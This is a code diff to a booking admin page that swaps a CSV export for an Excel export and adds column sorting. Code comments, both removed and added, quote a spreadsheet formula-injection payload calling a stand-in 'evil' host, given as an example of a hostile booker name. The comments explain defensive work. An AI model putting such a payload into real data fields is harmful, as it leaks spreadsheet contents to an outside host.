@@ -3,6 +3,7 @@
 import type { EventDayDefinition } from "@calcom/features/ne26-rooms/lib/eventSchedule";
 import { trpc } from "@calcom/trpc/react";
 import { useRouter } from "next/navigation";
+import { buildXlsx, type CellValue } from "@calcom/features/ne26-rooms/lib/xlsx";
 import { useMemo, useState } from "react";
 import BookingCalendar from "./BookingCalendar";
 import BookingSidePanel from "./BookingSidePanel";
@@ -85,59 +86,85 @@ function addOnsLabel(row: AdminBookingRow): string {
   return row.addOns.map((a) => `${a.name}×${a.quantity}`).join(", ");
 }
 
-function toCsv(rows: AdminBookingRow[]): string {
-  const header = [
-    "Room",
-    "Category",
-    "Date (Istanbul)",
-    "Start",
-    "End",
-    "Hours",
-    "Status",
-    "Booker name",
-    "Booker email",
-    "Ordered at",
-    "Paid at",
-    "Amount",
-    "Currency",
-    "Add-ons",
-    "Payment ID",
-    "Invoice",
-    "Credit note",
-  ];
-  const escapeCsv = (v: string | number | null): string => {
-    const s = v === null ? "" : String(v);
-    // Neutralise spreadsheet formula injection before quoting. bookerName is
-    // whatever the buyer typed into Stripe Checkout, so a name like
-    // =HYPERLINK("https://evil/"&A1,"click") would execute when the team opens
-    // this export in Excel to pass catering orders to the caterer.
-    const safe = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
-    return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
-  };
-  const lines = rows.map((r) =>
-    [
-      r.roomName,
-      r.category,
-      fmtDate(r.startUtc),
-      fmtTime(r.startUtc),
-      fmtTime(r.endUtc),
-      r.durationMinutes / 60,
-      r.status,
-      r.bookerName,
-      r.bookerEmail,
-      fmtDateTime(r.orderedAt),
-      r.paidAt ? fmtDateTime(r.paidAt) : "",
-      (r.amountTotal / 100).toFixed(2),
-      r.currency,
-      r.addOns.map((a) => `${a.name} x${a.quantity} (${(a.lineTotal / 100).toFixed(2)})`).join("; "),
-      r.stripePaymentId,
-      r.invoiceNumber,
-      r.creditNoteNumber,
-    ]
-      .map(escapeCsv)
-      .join(",")
-  );
-  return [header.join(","), ...lines].join("\n");
+/**
+ * The columns the accounting team works from, in the order they read them.
+ *
+ * This was a CSV, which meant a text-import dialog every time — which
+ * separator, which encoding, and why "NE26-2026-0006" arrived as a date. An
+ * .xlsx opens on a double click with its types intact.
+ *
+ * It also closes a hole the CSV had to patch by hand: a booker called
+ * `=HYPERLINK("https://evil/"&A1,"click")` — and the name comes from whatever
+ * the buyer typed at Stripe — executed when the team opened the file. A cell
+ * written as an inline string is text to Excel, never a formula, so nothing
+ * needs neutralising and nothing can be missed.
+ */
+type SortKey =
+  | "room"
+  | "when"
+  | "status"
+  | "booker"
+  | "ordered"
+  | "paid"
+  | "addOns"
+  | "amount"
+  | "invoice"
+  | "creditNote";
+
+const SORTABLE_COLUMNS: { key: SortKey; label: string; align?: "right" }[] = [
+  { key: "room", label: "Room" },
+  { key: "when", label: "When (Istanbul)" },
+  { key: "status", label: "Status" },
+  { key: "booker", label: "Booker" },
+  { key: "ordered", label: "Ordered" },
+  { key: "paid", label: "Paid" },
+  { key: "addOns", label: "Add-ons" },
+  { key: "amount", label: "Amount", align: "right" },
+  { key: "invoice", label: "Invoice" },
+  { key: "creditNote", label: "Credit note" },
+];
+
+const EXPORT_HEADERS = [
+  "Room",
+  "Category",
+  "Date (Istanbul)",
+  "Start",
+  "End",
+  "Hours",
+  "Status",
+  "Booker name",
+  "Booker email",
+  "Ordered at",
+  "Paid at",
+  "Amount excl. VAT",
+  "Currency",
+  "Add-ons",
+  "Payment ID",
+  "Invoice",
+  "Credit note",
+];
+
+function exportRows(rows: AdminBookingRow[]): CellValue[][] {
+  return rows.map((r) => [
+    r.roomName,
+    r.category,
+    fmtDate(r.startUtc),
+    fmtTime(r.startUtc),
+    fmtTime(r.endUtc),
+    r.durationMinutes / 60,
+    r.status,
+    r.bookerName,
+    r.bookerEmail,
+    fmtDateTime(r.orderedAt),
+    r.paidAt ? fmtDateTime(r.paidAt) : "",
+    // A number, so the accountant can sum the column instead of retyping it.
+    r.amountTotal / 100,
+    r.currency,
+    r.addOns.map((a) => `${a.name} x${a.quantity} (${(a.lineTotal / 100).toFixed(2)})`).join("; "),
+    r.stripePaymentId,
+    r.invoiceNumber,
+    r.creditNoteNumber,
+  ]);
 }
 
 export default function RoomsAdminView({
@@ -159,6 +186,15 @@ export default function RoomsAdminView({
   const [selectedUid, setSelectedUid] = useState<string | null>(null);
   const router = useRouter();
   const [pendingUid, setPendingUid] = useState<string | null>(null);
+  const [sort, setSort] = useState<{ key: SortKey; dir: "asc" | "desc" }>({
+    key: "when",
+    dir: "asc",
+  });
+
+  /** Same column again flips the direction; a new one starts ascending. */
+  function sortBy(key: SortKey): void {
+    setSort((s) => (s.key === key ? { key, dir: s.dir === "asc" ? "desc" : "asc" } : { key, dir: "asc" }));
+  }
   const creditNote = trpc.viewer.rooms.issueCreditNote.useMutation({
     onSettled: () => setPendingUid(null),
     onSuccess: () => router.refresh(),
@@ -173,9 +209,7 @@ export default function RoomsAdminView({
     // And it cancels the WHOLE order: saying "the booking" understated the
     // damage on a three-room order.
     const scope =
-      row.orderRoomCount > 1
-        ? `all ${row.orderRoomCount} rooms on this order`
-        : `${row.roomName}`;
+      row.orderRoomCount > 1 ? `all ${row.orderRoomCount} rooms on this order` : `${row.roomName}`;
     const ok = window.confirm(
       `Issue a credit note for ${row.bookerName}? This cancels ${scope}, frees the slots, and emails the booker. Refund the payment in Stripe separately.`
     );
@@ -237,17 +271,70 @@ export default function RoomsAdminView({
       return true;
     });
   }, [rows, status, roomFilter, dayFilter, query]);
+  /**
+   * Every column sorts, because which one matters depends on the question.
+   * Chasing an unpaid order is a sort by status; reconciling with the bank is a
+   * sort by amount; preparing the day is a sort by time. The table opened in
+   * time order and could only ever be read that way.
+   */
+  const sorted = useMemo(() => {
+    const { key, dir } = sort;
+    const sign = dir === "asc" ? 1 : -1;
+    const value = (r: AdminBookingRow): string | number => {
+      switch (key) {
+        case "room":
+          return r.roomName;
+        case "status":
+          return r.status;
+        case "booker":
+          return `${r.bookerName} ${r.bookerEmail}`;
+        case "ordered":
+          return r.orderedAt ?? "";
+        case "paid":
+          return r.paidAt ?? "";
+        case "addOns":
+          return r.addOns.length;
+        case "amount":
+          return r.amountTotal;
+        case "invoice":
+          return r.invoiceNumber ?? "";
+        case "creditNote":
+          return r.creditNoteNumber ?? "";
+        default:
+          return r.startUtc;
+      }
+    };
+    // Copied before sorting: sort() mutates, and `filtered` is memoised.
+    return [...filtered].sort((a, b) => {
+      const av = value(a);
+      const bv = value(b);
+      if (typeof av === "number" && typeof bv === "number") return (av - bv) * sign;
+      // Blank last whichever way the column is pointing — an unpaid booking has
+      // no paid date, and burying those among the dates helps nobody.
+      if (av === "" && bv !== "") return 1;
+      if (bv === "" && av !== "") return -1;
+      return String(av).localeCompare(String(bv), "en") * sign;
+    });
+  }, [filtered, sort]);
+
   const confirmed = useMemo(() => rows.filter((r) => r.status === "CONFIRMED"), [rows]);
   const revenue = confirmed.reduce((sum, r) => sum + r.amountTotal, 0);
   const currency = rows[0]?.currency ?? "EUR";
   const selectedBooking = selectedUid ? (rows.find((r) => r.uid === selectedUid) ?? null) : null;
 
-  function downloadCsv(): void {
-    const blob = new Blob([toCsv(filtered)], { type: "text/csv;charset=utf-8;" });
+  function downloadExcel(): void {
+    const book = buildXlsx({
+      sheetName: "Bookings",
+      headers: EXPORT_HEADERS,
+      rows: exportRows(sorted),
+    });
+    const blob = new Blob([book as BlobPart], {
+      type: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+    });
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
     a.href = url;
-    a.download = `ne26-bookings-${new Date().toISOString().slice(0, 10)}.csv`;
+    a.download = `ne26-bookings-${new Date().toISOString().slice(0, 10)}.xlsx`;
     a.click();
     URL.revokeObjectURL(url);
   }
@@ -261,12 +348,19 @@ export default function RoomsAdminView({
             {rows.length} bookings · {confirmed.length} confirmed · {fmtMoney(revenue, currency)} collected
           </p>
         </div>
-        <button
-          type="button"
-          onClick={downloadCsv}
-          className="rounded-lg bg-[#000643] px-4 py-2 font-semibold text-sm text-white transition hover:opacity-90">
-          Export CSV
-        </button>
+        <div className="flex flex-wrap gap-2">
+          <a
+            href="/api/ne26-rooms/export/documents"
+            className="rounded-lg border border-[#000643] px-4 py-2 font-semibold text-[#000643] text-sm transition hover:bg-[#000643]/5">
+            Download all invoices (ZIP)
+          </a>
+          <button
+            type="button"
+            onClick={downloadExcel}
+            className="rounded-lg bg-[#000643] px-4 py-2 font-semibold text-sm text-white transition hover:opacity-90">
+            Export Excel
+          </button>
+        </div>
       </div>
 
       <div className="mt-4 flex gap-2">
@@ -353,27 +447,33 @@ export default function RoomsAdminView({
           <table className="w-full text-left text-sm">
             <thead className="border-gray-100 border-b bg-gray-50 text-gray-500 text-xs uppercase">
               <tr>
-                <th className="px-3 py-3">Room</th>
-                <th className="px-3 py-3">When (Istanbul)</th>
-                <th className="px-3 py-3">Status</th>
-                <th className="px-3 py-3">Booker</th>
-                <th className="px-3 py-3">Ordered</th>
-                <th className="px-3 py-3">Paid</th>
-                <th className="px-3 py-3">Add-ons</th>
-                <th className="px-3 py-3 text-right">Amount</th>
-                <th className="px-3 py-3">Invoice</th>
-                <th className="px-3 py-3">Credit note</th>
+                {SORTABLE_COLUMNS.map(({ key, label, align }) => (
+                  <th key={key} className={`px-3 py-3 ${align === "right" ? "text-right" : ""}`}>
+                    <button
+                      type="button"
+                      onClick={() => sortBy(key)}
+                      aria-label={`Sort by ${label}`}
+                      className={`inline-flex items-center gap-1 uppercase transition hover:text-[#000643] ${
+                        sort.key === key ? "font-semibold text-[#000643]" : ""
+                      }`}>
+                      {label}
+                      <span aria-hidden className={sort.key === key ? "" : "opacity-0"}>
+                        {sort.dir === "asc" ? "▲" : "▼"}
+                      </span>
+                    </button>
+                  </th>
+                ))}
               </tr>
             </thead>
             <tbody>
-              {filtered.length === 0 ? (
+              {sorted.length === 0 ? (
                 <tr>
                   <td className="px-3 py-6 text-center text-gray-400" colSpan={8}>
                     No bookings
                   </td>
                 </tr>
               ) : (
-                filtered.map((r) => (
+                sorted.map((r) => (
                   <tr
                     key={r.uid}
                     className="border-gray-200 border-b align-top transition last:border-0 hover:bg-[#000643]/[0.03]">
